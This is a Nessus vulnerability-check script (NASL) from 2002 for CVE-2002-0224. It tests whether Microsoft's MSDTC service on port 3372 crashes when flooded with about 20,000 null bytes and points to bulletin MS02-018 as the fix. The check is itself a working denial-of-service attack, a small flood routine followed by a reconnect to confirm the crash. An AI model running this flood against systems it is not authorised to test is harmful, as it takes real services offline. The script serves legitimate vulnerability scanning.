#
# Crashes MSDTC
#
# by Michel Arboi <arboi@alussinan.org>
#
# See the Nessus Script License for details

if(description)
{
 script_id(10939);
 script_bugtraq_id(4006);
 script_version ("$Revision: 1.10 $");
 script_cve_id("CVE-2002-0224");
 name["english"] = "MSDTC denial of service by flooding with nul bytes";
 script_name(english:name["english"]);
 
 desc["english"] = "
It was possible to crash the MSDTC service by sending
20200 nul bytes.

Solution : Read the MS02-018 bulletin
http://www.microsoft.com/technet/security/bulletin/ms02-018.mspx

Risk factor : High";


 desc["francais"] = "
 Il s'est avéré possible de tuer le service MSDTC
en lui envoyant 20200 octets nuls.

Solution : Lisez le bulletin MS02-018
http://www.microsoft.com/technet/security/bulletin/ms02-018.mspx

Facteur de risque : Sérieux";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "crash the MSDTC service";
 summary["francais"] = "tue le service MSDTC";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DENIAL);
 
 
 script_copyright(english:"This script is Copyright (C) 2002  Michel Arboi",
		francais:"Ce script est Copyright (C) 2002 Michel Arboi");
 script_family(english:"Denial of Service");
 script_dependencie("find_service.nes");
 script_require_ports("Services/msdtc", 3372);
 exit(0);
}


#
# Here we go
#
port = get_kb_item("Services/msdtc");
if(!port)port = 3372;
if(!get_port_state(port))exit(0);
soc = open_sock_tcp(port);
if(!soc)exit(0);
# 20020 = 20*1001
zer = raw_string(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0);
send(socket:soc, data:zer) x 1001;
close(soc);
sleep(2);

soc2 = open_sock_tcp(port);
if(!soc2)security_hole(port);
